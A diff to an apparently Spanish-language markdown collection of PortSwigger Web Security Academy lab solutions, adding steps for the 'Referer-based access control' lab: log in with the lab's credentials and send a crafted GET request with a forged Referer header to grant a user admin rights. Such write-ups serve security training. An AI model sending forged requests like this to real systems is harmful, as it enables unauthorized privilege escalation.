@@ -1199,6 +1199,22 @@ Content-Length: 45
 action=upgrade&confirmed=true&username=wiener
 ```
 
+### [Referer-based access control](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)
+
+#### Solución:
+
+1. Iniciar sesión con las credenciales brindadas (wiener:peter)
+2. Enviar la siguiente request reemplazando LABID y COOKIE-SESSION-VALUE:
+
+```
+GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
+Host: LABID.web-security-academy.net
+Referer: https://LABID.web-security-academy.net/admin
+Cookie: session=COOKIE-SESSION-VALUE
+
+
+```
+
 ---
 
 ## [Authentication](https://portswigger.net/web-security/authentication)
